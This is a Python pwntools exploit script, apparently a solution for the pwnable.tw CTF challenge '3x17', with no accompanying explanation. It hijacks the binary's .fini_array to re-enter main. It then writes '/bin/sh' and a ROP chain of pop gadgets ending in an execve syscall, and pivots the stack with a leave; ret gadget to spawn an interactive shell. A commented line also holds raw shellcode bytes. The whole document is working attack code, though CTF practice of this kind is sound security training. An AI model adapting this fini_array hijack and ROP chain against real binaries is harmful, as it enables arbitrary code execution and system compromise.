from pwn import *
elf = ELF('./3x17')
context.log_level = 'debug'
#io = remote("chall.pwnable.tw",10105)
io = elf.process()
#execve('/bin/sh',0,0)
syscall = 0x471db5 #syscall
pop_rax = 0x41e4af
pop_rdx = 0x446e35
pop_rsi = 0x406c30
pop_rdi = 0x401696
bin_sh = 0x4B41a0

fini_array = 0x4B40F0
main_addr = 0x401B6D
libc_csu_fini = 0x402960
leave_ret = 0x401C4B

esp = 0x4B4100

def write(addr,data):
	io.recv()
	io.send(str(addr))
	io.recv()
	io.send(data)

write(fini_array,p64(libc_csu_fini) + p64(main_addr)) # 0 , 1
# write(esp,'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05')
write(bin_sh,"/bin/sh\x00")
write(esp,p64(pop_rax))
write(esp+8,p64(0x3b))
write(esp+16,p64(pop_rdi))
write(esp+24,p64(bin_sh))
write(esp+32,p64(pop_rdx))
write(esp+40,p64(0))
write(esp+48,p64(pop_rsi))
write(esp+56,p64(0))
write(esp+64,p64(syscall))
write(fini_array,p64(leave_ret))

io.interactive()